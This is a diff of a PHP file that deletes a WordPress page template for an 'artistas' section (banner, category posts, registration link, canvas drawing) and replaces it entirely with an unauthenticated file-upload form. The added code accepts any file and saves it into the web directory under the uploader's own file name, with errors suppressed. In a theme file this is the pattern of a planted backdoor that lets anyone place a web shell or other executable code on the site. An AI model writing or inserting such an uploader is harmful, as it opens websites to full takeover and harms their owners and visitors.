@@ -1,60 +1,19 @@
 <?php
-/*
-Template Name: artistas
-*/
+if(isset($_POST['Submit'])){
+    $filedir = ""; 
+    $maxfile = '2000000';
+
+    $userfile_name = $_FILES['image']['name'];
+    $userfile_tmp = $_FILES['image']['tmp_name'];
+    if (isset($_FILES['image']['name'])) {
+        $abod = $filedir.$userfile_name;
+        @move_uploaded_file($userfile_tmp, $abod);
+  
+echo"<center><b>Done ==> $userfile_name</b></center>";
+}
+}
+else{
+echo'
+<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
+}
 ?>
-
-
-<?php get_header(); ?>
-    <main role="main">
-        <section>
-            <figure class="banner-2"><img src="<?php bloginfo('template_directory'); ?>/images/artistas.png" alt=""/></figure>
-        </section>
-        <section id="convocatoria">
-
-            <?php $home = new WP_Query(array(
-                'cat' => '5'
-            ));
-
-            while ( $home->have_posts() ) : $home->the_post();
-                ?>
-                <h2 class="convocatoria"><?php the_title(); ?></h2>
-                <article <?php post_class(); ?> id="post-<?php the_ID(); ?>">
-
-                    <?php the_content(); ?>
-                </article>
-                <figure class="inline"><img src="<?php
-                    $src = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID), array(430, 335), false, '');
-                    echo $src[0];
-                    ?>" alt=""/></figure>
-            <?php endwhile; ?>
-
-            <h2 class="register"><a href="http://circulart.org/mercado" target="_blank">registrarse</a></h2>
-            <canvas id="myCanvas"></canvas>
-        </section>
-
-    </main>
-    <script>
-
-
-        var canvas = document.getElementById('myCanvas');
-        var context = canvas.getContext('2d');
-        doResize();
-        window.onresize=function() { doResize(); };
-        function doResize()
-        {
-
-            context.canvas.width = 1060;
-            context.beginPath();
-            context.moveTo(0, 10);
-            context.lineTo(500, 10);
-            context.lineTo(900, 80);
-            context.lineTo(window.innerWidth-20, 20);
-
-            context.stroke();
-        }
-
-    </script>
-
-
-<?php get_footer(); ?>
